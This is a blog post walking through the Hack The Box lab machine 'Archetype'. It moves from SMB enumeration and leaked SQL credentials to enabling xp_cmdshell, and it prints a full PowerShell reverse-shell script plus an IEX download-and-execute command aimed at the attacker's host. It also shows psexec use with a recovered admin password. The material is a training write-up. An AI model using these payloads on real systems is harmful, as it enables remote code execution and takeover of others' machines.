---
layout: post
title: "Archetype - HTB starting point"
date: 2021-04-07 00:00:0
permalink: starting-point-archetype/
tags: hackthebox "starting point"
---

* __Target IP:__ 10.10.10.27 
* __Tools used:__ nmap, smbclient, mssqclient.py, python3, ufw, nc, psexec.py

_This is gonna be a lil bit detailed since it's the first machine in this series. I use ubuntu, so you might not need to use `sudo`_

## __Phase 1:__ Enumeration

We scan the IP for the open ports using `nmap`
```shell
$ nmap -sC -sV -O -oA nmap/archetype 10.10.10.27
```

<img src="/assets/images/archetype/nmap-scan-1-archetype.png">

We found two crucial ports open:<br>
On `445` __SMB__ is running <br>
On `1433` __SQL__ is running

Lets check if anonymous login is available on __SMB__

```shell
$ smbclient -N -L //10.10.10.27/
```
<img src="/assets/images/archetype/smb-1-archetype.png">

Lets enumerate `backups` share/directory because it might contain config files which usually have usernames and passwords
```shell
$ smbclient -N //10.10.10.27/backups
```
<img src="/assets/images/archetype/smb-2-archetype.png">

After listing directory contents using `dir`<br>
`prod.dtsConfig` file is found. It's a config file of __SQL__. <br>
Download the file using `get prod.dtsConfig`<br>
Contents of the file:

<img src="/assets/images/archetype/config-file-archetype.png">

We got SQL _user creds:_ <br>
__User ID__ = ARCHETYPE\sql_svc <br>
__Password__ = M3g4c0rp123

Now that we've SQL creds, we can establish a SQL connection using `mssqlclient.py` -  can be found in examples folder of [impackets](https://github.com/SecureAuthCorp/impacket)
```shell
$ python3 mssqlclient.py sql_svc@10.10.10.27 -windows-auth
```
It asks for the password, give the password we found in config file

<img src="/assets/images/archetype/sql-connection-archetype.png">
Lets check if we've administrative privileges on SQL database
```shell
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```
<img src="/assets/images/archetype/sql-srvrolemember-archetype.png">

We got output as `1` - meaning: Yes, we've indeed.

Now, we can configure few database settings so that we can run `cmd` commands on the host system - system that's hosting this database, in our case that's our target `10.10.10.27`

To execute cmd commands through SQL shell, there's a command called `xp_cmdshell`.<br>
* To enable this we need administrative privileages that's why we checked if we'd admin privileages or not.<br>
* Second thing is to enable `show advanced options`

Let's check default values:
```shell
SQL> sp_configure
```
<img src="/assets/images/archetype/sql-sp-configure-archetype.png">
<img src="/assets/images/archetype/sql-advanced-option-initial-archetype.png">

* To enable `show advanced options`:

```shell
SQL> EXEC sp_configure 'show advanced options', 1
SQL> reconfigure;
```

* To enable `xp_cmdshell`:

```shell
SQL> EXEC sp_configure 'xp_cmdshell', 1
SQL> reconfigure;
SQL> sp_configure;
```
After enabling both

<img src="/assets/images/archetype/sql-sp-configure-set-archetype.png">

Now we can run `cmd` commands using 
`xp_cmdshell`
```shell
SQL> xp_cmdshell 'whoami'
```
<img src="/assets/images/archetype/sql-whoami-archetype.png">
Now lets get a reverse shell using powershell script

## __Phase 2:__ Foothold

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.41",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

* Copy the above `powershell` script into a file with extension `.ps1`
* Change the `IP` in the script to your own htb IP

Start a python server in reverse shell script folder, so that we can download the script onto victim system and run it.
```shell
$ sudo python3 -m http.server 80
```
Start a listener using `netcat`. When victim system tries to connect to us, we need to listen for it. Hence the name: `reverse shell` 
```shell
$ sudo nc -lvnp 443
```
I'm ubuntu, so firewall is not enabled by default but if you're on parrot security then it is enabled by default. Then you need to allow connections from target IP

```shell
$ sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443
```

Run the below command to download our shell script onto the target system and execute it. <br>
Here also change the IP
```shell
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.41/shell.ps1\");
```

Check the nc listner status <br>
And when connection established.. <br>
You can read the _user.txt_ but that's not needed in this challenge.

Let's check the powershell history to view what were the user's recent actions and looks like we found:

__Administrator password:__ MEGACORP_4dm1n!!

<img src="/assets/images/archetype/nc-archetype.png">

## __Phase 3:__ Privilege Escalation
Now that we have admin password, we can try logging in using `psexec.py` can be found in impacket/examples
```shell
$ sudo python3 psexec.py administrator@10.10.10.27 
```
It prompts for password, enter the password and you have the SHELL!!

```
$ type c:\users\administrator\desktop\root.txt
```

##### Submit the flag, happy hacking :)